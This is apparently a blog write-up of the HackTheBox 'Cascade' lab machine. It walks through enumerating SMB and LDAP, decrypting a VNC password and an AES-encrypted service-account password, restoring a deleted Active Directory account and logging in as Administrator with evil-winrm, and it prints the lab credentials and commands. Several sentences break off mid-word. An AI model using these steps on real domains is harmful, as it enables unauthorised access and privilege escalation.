---
layout: single
title: "HTB Cascade write-up - test"
author_profile: true
categories: 
  - htb
  - write-ups
classes: wide
tags:
  - htb
  - windows
  - dotnet
  - crypto
---

![Cascade on HTB](/assets/images/cascade_info.png)

*Cascade* was a medium rated Windows box on [HackTheBox](https://www.hackthebox.eu/){:target="_blank"}. Check out my write-up [here](https://github.com/Muemmelmoehre/write-ups/blob/master/cascade.pdf){:target="blank"}.


Timeline
========

1.  Retrieve a user list from `rpc`.

2.  With the help of `ldapsearch`, discover *r.thompson*'s legacy
    password : **rY4n5eva**.

3.  Enumerate `smb` as *r.thompson* and discover `s.smith`'s encrypted
    *VNC* password in `VNC Install.reg`.

4.  Decrypt the password : **sT333ve2**.

5.  Log in as *s.smith* via `evil-winrm` and retrieve the user flag.

6.  Retrieve a database file and some binaries from `smb` as *s.smith*.

7.  In the database, discover the encrypted password for the service
    account *ArkSvc*.

8.  Decompile the binaries and discover the included encryption and
    decryption routines.

9.  Decrypt *ArkSvc*'s password : **w3lc0meFr31nd**.

10. Connect via `evil-winrm` as *ArkSvc* and retrieve details on the
    deleted *TempAdmin* account by querying the `AD`. Discover
    *TempAdmin*'s legacy password : **baCT3r1aN00dles**.

11. *TempAdmin*'s password is the same as the *Administrator*'s
    password - log in as *Administrator* via `evil-winrm` and grab the
    root flag.

Details
=======

Initial foothold
----------------

### `RPC` enumeration

The initial `nmap` scan reveals the `rpc` service running. We're able to
connect as anonymous user with `rpcclient -U "" 10.10.10.182`[^1]. Once
connected, we can retrieve a list of domain users with `enumdomusers` :

<!--![image](c9abf5f753217e74e76a150b11d5ffbf.png)-->

The n

### `LDAP` enumeration

Again refering to our initial `nmap` scan, we know that the `ldap`
service is active. We query it for information with
`ldapsearch -x -h 10.1

### `SMB` enumeration

With our freshly baked pass

``` 
smbmap -u r.thompson -p rY4n5eva -d cascade.local -H 10.10.10.182
[+] Finding open SMB ports....
[+] User SMB session established on 10.10.10.182...
[+] IP: 10.10.10.182:445	Name: cascade.local                                     
Disk                                  	Permissions	Comment
----                                   	-----------	-------
ADMIN$                                	NO ACCESS	Remote Admin
Audit$                                 	NO ACCESS	
C$                                     	NO ACCESS	Default share
.                                                  
dr--r--r--        0 Tue Jan 28 17:05:51 2020	.
dr--r--r--        0 Tue Jan 28 17:05:51 2020	..
dr--r--r--        0 Sun Jan 12 20:45:14 2020	Contractors
dr--r--r--        0 Sun Jan 12 20:45:10 2020	Finance
dr--r--r--        0 Tue Jan 28 13:04:51 2020	IT
dr--r--r--        0 Sun Jan 12 20:45:20 2020	Production
dr--r--r--        0 Sun Jan 12 20:45:16 2020	Temps
Data                                        	READ ONLY	
IPC$                                        	NO ACCESS	Remote IPC
.                                                  
dr--r--r--        0 Wed Jan 15 16:50:33 2020	.
dr--r--r--        0 Wed Jan 15 16:50:33 2020	..
fr--r--r--      258 Wed Jan 15 16:50:14 2020	MapAuditDrive.vbs
fr--r--r--      255 Wed Jan 15 16:51:03 2020	MapDataDrive.vbs
NETLOGON                                      	READ ONLY	Logon server share 
.                                                  
dr--r--r--        0 Thu Jan  9 18:06:29 2020	.
dr--r--r--        0 Thu Jan  9 18:06:29 2020	..
dr--r--r--        0 Thu Jan  9 18:06:29 2020	color
dr--r--r--        0 Thu Jan  9 18:06:29 2020	IA64
dr--r--r--        0 Thu Jan  9 18:06:29 2020	W32X86
dr--r--r--        0 Sun Jan 12 22:09:11 2020	x64
print$                                       	READ ONLY	Printer Drivers
.                                                  
dr--r--r--        0 Thu Jan  9 10:31:27 2020	.
dr--r--r--        0 Thu Jan  9 10:31:27 2020	..
dr--r--r--        0 Thu Jan  9 10:31:27 2020	cascade.local
SYSVOL                                        	READ ONLY	Logon server share 
```

Time to enumerate these shares!

User
----

### *VNC*

We connect to the `Data` share with

`smbclient \\\\10.10.10.182\\Data -U r.thompson%rY4n5eva`

and retrieve several files from `\\10.10.10.182\Data\IT\Temp\s.smith\`,
the most interesting of them being `VNC Install.reg`. We view its
content with `cat VNC\ Install.reg` :

```cat VNC\ Install.reg 
Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC]

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]
"ExtraPorts"=""
"QueryTimeout"=dword:0000001e
"QueryAcceptOnTimeout"=dword:00000000
"LocalInputPriorityTimeout"=dword:00000003
"LocalInputPriority"=dword:00000000
"BlockRemoteInput"=dword:00000000
"BlockLocalInput"=dword:00000000
"IpAccessControl"=""
"RfbPort"=dword:0000170c
"HttpPort"=dword:000016a8
"DisconnectAction"=dword:00000000
"AcceptRfbConnections"=dword:00000001
"UseVncAuthentication"=dword:00000001
"UseControlAuthentication"=dword:00000000
"RepeatControlAuthentication"=dword:00000000
"LoopbackOnly"=dword:00000000
"AcceptHttpConnections"=dword:00000001
"LogLevel"=dword:00000000
"EnableFileTransfers"=dword:00000001
"RemoveWallpaper"=dword:00000001
"UseD3D"=dword:00000001
"UseMirrorDriver"=dword:00000001
"EnableUrlParams"=dword:00000001
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
"AlwaysShared"=dword:00000000
"NeverShared"=dword:00000000
"DisconnectClients"=dword:00000001
"PollingInterval"=dword:000003e8
"AllowLoopback"=dword:00000000
"VideoRecognitionInterval"=dword:00000bb8
"GrabTransparentWindows"=dword:00000001
"SaveLogToAllUsersPath"=dword:00000000
"RunControlInterface"=dword:00000001
"IdleTimeout"=dword:00000000
"VideoClasses"=""
"VideoRects"=""
```

The encrypted password is listed in hexadecimal :

`"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f`

The file we found is actually an excerpt from the registry entries
related to *TightVNC* on the box. The password is encrypted with
`DES`[^4] and can be decrypted with tools like *VNC Password
Recovery*[^5] :


From the folder structure on the share, this is most likely *s.smith*'s
password. Another file we find on the share in
`\\10.10.10.182\Data\IT\Email Archives\` is the email
`Meeting_Notes_June_2018.html` :


The email contains a hint towards the *Administrator* account :



### User flag

With *s.smith*'s password **sT333ve2**, we're able to log onto the box
via `evil-winrm` with
`evil-winrm -i 10.10.10.182 -u s.smith -p sT333ve2` :



Root
----

### More `SMB` enumeration

With *s.smith*'s credentials, we're back to enumerating[^6] `smb` :

``` 
smbmap -u s.smith -p sT333ve2 -d cascade.local -H 10.10.10.182
[+] Finding open SMB ports....
[+] User SMB session established on 10.10.10.182...
[+] IP: 10.10.10.182:445	Name: cascade.local                                     
Disk                                  	Permissions	Comment
----                                  	-----------	-------
ADMIN$                                	NO ACCESS	Remote Admin
.                                            
dr--r--r--        0 Wed Jan 29 13:01:26 2020	.
dr--r--r--        0 Wed Jan 29 13:01:26 2020	..
fr--r--r--    13312 Tue Jan 28 16:47:08 2020	CascAudit.exe
fr--r--r--    12288 Wed Jan 29 13:01:26 2020	CascCrypto.dll
dr--r--r--        0 Tue Jan 28 16:43:18 2020	DB
fr--r--r--       45 Tue Jan 28 18:29:47 2020	RunAudit.bat
fr--r--r--   363520 Tue Jan 28 15:42:18 2020	System.Data.SQLite.dll
fr--r--r--   186880 Tue Jan 28 15:42:18 2020	System.Data.SQLite.EF6.dll
dr--r--r--        0 Tue Jan 28 15:42:18 2020	x64
dr--r--r--        0 Tue Jan 28 15:42:18 2020	x86
Audit$                                    	READ ONLY	
C$                                        	NO ACCESS	Default share
.                                                  
dr--r--r--        0 Tue Jan 28 17:05:51 2020	.
dr--r--r--        0 Tue Jan 28 17:05:51 2020	..
dr--r--r--        0 Sun Jan 12 20:45:14 2020	Contractors
dr--r--r--        0 Sun Jan 12 20:45:10 2020	Finance
dr--r--r--        0 Tue Jan 28 13:04:51 2020	IT
dr--r--r--        0 Sun Jan 12 20:45:20 2020	Production
dr--r--r--        0 Sun Jan 12 20:45:16 2020	Temps
Data                                          	READ ONLY	
IPC$                                          	NO ACCESS	Remote IPC
.                                                  
dr--r--r--        0 Wed Jan 15 16:50:33 2020	.
dr--r--r--        0 Wed Jan 15 16:50:33 2020	..
fr--r--r--      258 Wed Jan 15 16:50:14 2020	MapAuditDrive.vbs
fr--r--r--      255 Wed Jan 15 16:51:03 2020	MapDataDrive.vbs
NETLOGON                                     	READ ONLY	Logon server share 
.                                                  
dr--r--r--        0 Thu Jan  9 18:06:29 2020	.
dr--r--r--        0 Thu Jan  9 18:06:29 2020	..
dr--r--r--        0 Thu Jan  9 18:06:29 2020	color
dr--r--r--        0 Thu Jan  9 18:06:29 2020	IA64
dr--r--r--        0 Thu Jan  9 18:06:29 2020	W32X86
dr--r--r--        0 Sun Jan 12 22:09:11 2020	x64
print$                                        	READ ONLY	Printer Drivers
.                                                  
dr--r--r--        0 Thu Jan  9 10:31:27 2020	.
dr--r--r--        0 Thu Jan  9 10:31:27 2020	..
dr--r--r--        0 Thu Jan  9 10:31:27 2020	cascade.local
SYSVOL                                        	READ ONLY	Logon server share 
```

From the `Audit` share, we're able to retrieve

-   a database file `Audit.db` (from the `DB` folder),

-   an executable `CascAudit.exe` and

-   a library `CascCrypt.dll`

with `smbclient \\\\10.10.10.182\\Audit$ -U s.smith%sT333ve2`. The next
step is to take a closer look at the database.[^7] In the *Ldap* table,
we find a password for the service account *ArkSvc* :


The password string isn't simply the `base64`-encoded cleartext password
- it is actually encrypted (as we'll see shortly). Good thing we found a
crypto library not far from the database file!

### Decompiling the binaries

On a Windows machine, we decompile the two binaries[^8] - they're, as it
turns out, written in `C#`.

#### `CascAudit.exe`

When reviewing the code, the decompiled `exe` file reveals that its
purpose is to run an audit to find deleted users and write its results
to a database :

```
// Decompiled with JetBrains decompiler
// Type: CascAudiot.MainModule
// Assembly: CascAudit, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A5ED61EF-EE06-4B4D-B028-DFA5DECD972B
// Assembly location: Z:\CascAudit.exe

using CascAudiot.My;
using CascCrypto;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.Data.SQLite;
using System.DirectoryServices;

namespace CascAudiot
{
  [StandardModule]
  internal sealed class MainModule
  {
    private const int USER_DISABLED = 2;

    [STAThread]
    public static void Main()
    {
      if (MyProject.Application.CommandLineArgs.Count != 1)
      {
        Console.WriteLine("Invalid number of command line args specified. Must specify database path only");
      }
      else
      {
        using (SQLiteConnection sqLiteConnection = new SQLiteConnection("Data Source=" + MyProject.Application.CommandLineArgs[0] + ";Version=3;"))
        {
          string empty1 = string.Empty;
          string str = string.Empty;
          string empty2 = string.Empty;
          try
          {
            sqLiteConnection.Open();
            using (SQLiteCommand sqLiteCommand = new SQLiteCommand("SELECT * FROM LDAP", sqLiteConnection))
            {
              using (SQLiteDataReader sqLiteDataReader = sqLiteCommand.ExecuteReader())
              {
                sqLiteDataReader.Read();
                empty1 = Conversions.ToString(sqLiteDataReader.get_Item("Uname"));
                empty2 = Conversions.ToString(sqLiteDataReader.get_Item("Domain"));
                string EncryptedString = Conversions.ToString(sqLiteDataReader.get_Item("Pwd"));
                try
                {
                  str = Crypto.DecryptString(EncryptedString, "c4scadek3y654321");
                }
                catch (Exception ex)
                {
                  ProjectData.SetProjectError(ex);
                  Console.WriteLine("Error decrypting password: " + ex.Message);
                  ProjectData.ClearProjectError();
                  return;
                }
              }
            }
            sqLiteConnection.Close();
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            Console.WriteLine("Error getting LDAP connection data From database: " + ex.Message);
            ProjectData.ClearProjectError();
            return;
          }
          int num = 0;
          using (DirectoryEntry searchRoot = new DirectoryEntry())
          {
            searchRoot.Username = empty2 + "\\" + empty1;
            searchRoot.Password = str;
            searchRoot.AuthenticationType = AuthenticationTypes.Secure;
            using (DirectorySearcher directorySearcher = new DirectorySearcher(searchRoot))
            {
              directorySearcher.Tombstone = true;
              directorySearcher.PageSize = 1000;
              directorySearcher.Filter = "(&(isDeleted=TRUE)(objectclass=user))";
              directorySearcher.PropertiesToLoad.AddRange(new string[3]
              {
                "cn",
                "sAMAccountName",
                "distinguishedName"
              });
              using (SearchResultCollection all = directorySearcher.FindAll())
              {
                Console.WriteLine("Found " + Conversions.ToString(all.Count) + " results from LDAP query");
                sqLiteConnection.Open();
                try
                {
                  IEnumerator enumerator;
                  try
                  {
                    enumerator = all.GetEnumerator();
                    while (enumerator.MoveNext())
                    {
                      SearchResult current = (SearchResult) enumerator.Current;
                      string empty3 = string.Empty;
                      string empty4 = string.Empty;
                      string empty5 = string.Empty;
                      if (current.Properties.Contains("cn"))
                        empty3 = Conversions.ToString(current.Properties["cn"][0]);
                      if (current.Properties.Contains("sAMAccountName"))
                        empty4 = Conversions.ToString(current.Properties["sAMAccountName"][0]);
                      if (current.Properties.Contains("distinguishedName"))
                        empty5 = Conversions.ToString(current.Properties["distinguishedName"][0]);
                      using (SQLiteCommand sqLiteCommand = new SQLiteCommand("INSERT INTO DeletedUserAudit (Name,Username,DistinguishedName) VALUES (@Name,@Username,@Dn)", sqLiteConnection))
                      {
                        sqLiteCommand.get_Parameters().AddWithValue("@Name", (object) empty3);
                        sqLiteCommand.get_Parameters().AddWithValue("@Username", (object) empty4);
                        sqLiteCommand.get_Parameters().AddWithValue("@Dn", (object) empty5);
                        checked { num += sqLiteCommand.ExecuteNonQuery(); }
                      }
                    }
                  }
                  finally
                  {
                    if (enumerator is IDisposable)
                      (enumerator as IDisposable).Dispose();
                  }
                }
                finally
                {
                  sqLiteConnection.Close();
                  Console.WriteLine("Successfully inserted " + Conversions.ToString(num) + " row(s) into database");
                }
              }
            }
          }
        }
      }
    }
  }
}
```

In order to run the audit and retrieve the information about deleted
users, the pro

#### `CascCrypt.dll`

The decompiled library finally revetString` method; there,
we also find the hardcoded *Initialization Vector (IV)* :
`1tdyjCbY1Ix49842` :



With these configuration details, we know everthing we need in order to
decrypt *ArkSvc*'s password.

### Privilege escalation to user *ArkSvc*

Time to head once again over to *CyberChef*[^9]! First, the encrypted
password string needs to be `base64`-decoded, then we can plug the
values for the `AES` decryption :


Everything goes smoothly and we're presented with the cleartext password
for *ArkSvc* : **w3lc0meFr31nd**.[^10]

### Deleted user *TempAdmin*

For the privilege escalation to *Administrator*, we come back to the
meeting recap we found earlier - the one mentioning a deleted user
*TempAdmin* which had the same password than the actual *Administrator*
password. We also find a mention of that account in
`\\10.10.10.182\Data\IT\Logs\Ark AD Recycle Bin\ArkAdRecycleBin.log` :

``` {.csh language="csh" frame="single" breaklines="true" keepspaces="true" basicstyle="\\footnotesize\\ttfamily" showstringspaces="false"}
1/10/2018 15:43	[MAIN_THREAD]	** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
1/10/2018 15:43	[MAIN_THREAD]	Validating settings...
1/10/2018 15:43	[MAIN_THREAD]	Error: Access is denied
1/10/2018 15:43	[MAIN_THREAD]	Exiting with error code 5
2/10/2018 15:56	[MAIN_THREAD]	** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
2/10/2018 15:56	[MAIN_THREAD]	Validating settings...
2/10/2018 15:56	[MAIN_THREAD]	Running as user CASCADE\ArkSvc
2/10/2018 15:56	[MAIN_THREAD]	Moving object to AD recycle bin CN=Test,OU=Users,OU=UK,DC=cascade,DC=local
2/10/2018 15:56	[MAIN_THREAD]	Successfully moved object. New location CN=Test\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local
2/10/2018 15:56	[MAIN_THREAD]	Exiting with error code 0	
8/12/2018 12:22	[MAIN_THREAD]	** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
8/12/2018 12:22	[MAIN_THREAD]	Validating settings...
8/12/2018 12:22	[MAIN_THREAD]	Running as user CASCADE\ArkSvc
8/12/2018 12:22	[MAIN_THREAD]	Moving object to AD recycle bin CN=TempAdmin,OU=Users,OU=UK,DC=cascade,DC=local
8/12/2018 12:22	[MAIN_THREAD]	Successfully moved object. New location CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
8/12/2018 12:22	[MAIN_THREAD]	Exiting with error code 0
```

Apparently, the account has indeed be deleted in the meantime. The file
also confirms that *AD Recycle Bin* is enabled on the box. Maybe they're
is still some information available. As *ArkSvc*, we connect to the box
via `evil-winrm` and query the *Active Directory* for information on the
deleted user *TempAdmin* with

`Get-ADObject -Filter {displayName -eq "TempAdmin"} -IncludeDeletedObjects`



The `Common Name (CN)` of the account is now suffixed by `\0ADEL`,
marking it as a deleted user. The idea here is to restore the user
object in order to be able to query its attributes - maybe we'll be able
to dig up something interesting.[^11] We restore the user object with :

`Get-ADObject -Filter {displayName -eq "TempAdmin\0ADEL"} -IncludeDeletedObjects | Restore-ADObject`



Now, we look for interesting attributes to the restored object with :

`get-adobject -SearchBase "DC=cascade,DC=local" -filter{SamAccountName -eq "TempAdmin"} -IncludeDeletedObjects -properties * | Select-Object *`

```
accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
CN                              : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
codePage                        : 0
countryCode                     : 0
Created                         : 1/27/2020 3:23:08 AM
createTimeStamp                 : 1/27/2020 3:23:08 AM
Deleted                         : True
Description                     :
DisplayName                     : TempAdmin
DistinguishedName               : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
dSCorePropagationData           : {1/27/2020 3:23:08 AM, 1/1/1601 12:00:00 AM}
givenName                       : TempAdmin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=Users,OU=UK,DC=cascade,DC=local
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 1/27/2020 3:24:34 AM
modifyTimeStamp                 : 1/27/2020 3:24:34 AM
msDS-LastKnownRDN               : TempAdmin
Name                            : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : f0cc344d-31e0-4866-bceb-a842791ca059
objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1136
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 132245689883479503
sAMAccountName                  : TempAdmin
sDRightsEffective               : 0
userAccountControl              : 66048
userPrincipalName               : TempAdmin@cascade.local
uSNChanged                      : 237705
uSNCreated                      : 237695
whenChanged                     : 1/27/2020 3:24:34 AM
whenCreated                     : 1/27/2020 3:23:08 AM
PropertyNames                   : {accountExpires, badPasswordTime, badPwdCount, CanonicalName...}
PropertyCount                   : 42
```

Once again, we find a `cascadeLegacyPwd` :



### Root flag

The final step is to log onto the box as *Administrator* with
`evil-winrm -i 10.10.10.182 -u Administrator -p baCT3r1aN00dles` :



[^1]: Simply hit `enter` when prompted for a password.

[^2]: Available in its online version at
    <https://gchq.github.io/CyberChef/>, last visited : 2020-07-24.

[^3]: Output slightly modified for readability.

[^4]: For further information on *VNC* passwords and how to retrieve and
    decrypt them, see Raymond's blog post :
    <https://www.raymond.cc/blog/crack-or-decrypt-vnc-server-encrypted-password/>,
    last visited : 2020-07-24.

[^5]: <https://securityxploded.com/vnc-password-recovery.php>, last
    visited : 2020-07-24.

[^6]: Output slightly modified for readability.

[^7]: I used a program that ships with *Kali*, `DB Browser for SQLite`,
    for this step.

[^8]: Personally, I like *Jetbrain*'s *dotPeek* a lot :
    <https://www.jetbrains.com/decompiler/>, last visited : 2020-07-24.

[^9]: Of course, the *Chef* isn't the only tool up to the task - you
    could write your own script, reuse snippets from the decompiled code
    or use any other tool that can decrypt `AES`. As our ciphertext is
    `base64`-encoded, I found the *Chef* to be very well-suited for my
    purpose.

[^10]: At this point, I wasn't too sure where the journey would lead me
    on this box and I spent a lot of time checking out different
    possible attack surfaces. As I now had a service account under my
    control and as this is a Windows box with a domain set up, I always
    like to check whether *Kerberoasting* is an option or whether I can
    elevate my privileges due to a poorly locked down service account.
    This wasn't the intended attack vector this time though. Never hurts
    to try I guess\... And good thing the breadcrumbs for *TempAdmin*
    were there!

[^11]: For more information on restoring deleted *Active Directory*
    objects, see e. g. Josh Van Cott's article :
    <https://www.lepide.com/how-to/restore-deleted-objects-in-active-directory.html>
    or the *Microsoft* documentation :
    <https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd379509(v=ws.10)?redirectedfrom=MSDN>.
    For further details on how to recover a local admin account's
    password, see e. g. Sean Metcalf's post about *LAPS* :
    <https://adsecurity.org/?p=3164> or Daniel Ulrich's post to the same
    topic : <https://secureidentity.se/recover-laps-passwords/>. All
    links last visited : 2020-07-24.
